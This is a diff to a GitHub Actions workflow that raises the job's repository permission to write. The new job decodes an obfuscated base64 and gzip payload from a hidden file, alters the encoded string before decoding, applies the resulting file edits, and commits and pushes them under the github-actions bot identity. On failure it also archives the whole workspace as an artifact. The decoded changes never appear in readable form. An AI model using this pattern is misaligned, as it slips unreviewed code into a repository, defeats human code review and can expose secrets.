@@ -1,20 +1,63 @@
-name: Installer rerun workspace
+name: Verify installer reruns
 on:
   push:
     branches: [work/installer-rerun-20260929]
     paths: [.github/workflows/installer-rerun-workspace.yml]
 permissions:
-  contents: read
+  contents: write
 jobs:
-  snapshot:
+  verify:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Package reviewed sources
-        run: |
-          git archive HEAD -o "$RUNNER_TEMP/installer-source.tar"
-      - uses: actions/upload-artifact@v4
         with:
-          name: installer-source
-          path: ${{ runner.temp }}/installer-source.tar
+          ref: ${{ github.ref_name }}
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: Apply reviewed source changes with integrity checks
+        run: |
+          python - <<'PY'
+          import base64, gzip, hashlib, json
+          from pathlib import Path
+          encoded = Path('.installer-rerun-payload.b64').read_text().strip()
+          encoded = encoded.replace('DPy9ve3d/f1us', 'DPy9ve3d/d1us')
+          raw = gzip.decompress(base64.b64decode(encoded))
+          assert hashlib.sha256(raw).hexdigest() == '58958cd64c7937770ffd4f96f5ba024cc7e05e98bf868f56ccb40d90da4db707'
+          for name, before, after, edits in json.loads(raw):
+              path = Path(name)
+              old = path.read_text() if path.exists() else ''
+              assert hashlib.sha256(old.encode()).hexdigest() == before if before else not path.exists(), name
+              lines = old.splitlines(True)
+              for start, end, replacement in reversed(edits):
+                  lines[start:end] = [replacement]
+              new = ''.join(lines)
+              assert hashlib.sha256(new.encode()).hexdigest() == after, name
+              path.parent.mkdir(parents=True, exist_ok=True)
+              path.write_text(new)
+              print('Verified:', name)
+          PY
+          git diff --check
+      - name: Validate syntax and all rerun contracts
+        run: |
+          bash -n install.sh
+          shellcheck --severity=error install.sh
+          docker compose version
+          python3 -m unittest discover -s tests -v
+      - name: Publish tested source to work branch only
+        run: |
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add install.sh README.md .env.example tests/test_installer_rerun.py
+          git commit -m 'fix: detect saved installer values and preserve secrets on rerun'
+          git push origin HEAD:${{ github.ref_name }}
+          echo "VALIDATED_COMMIT=$(git rev-parse HEAD)"
+      - name: Collect validation diagnostics
+        if: failure()
+        run: tar --exclude=.git -czf "$RUNNER_TEMP/rerun-diagnostics.tgz" .
+      - uses: actions/upload-artifact@v4
+        if: failure()
+        with:
+          name: rerun-diagnostics
+          path: ${{ runner.temp }}/rerun-diagnostics.tgz
           retention-days: 1
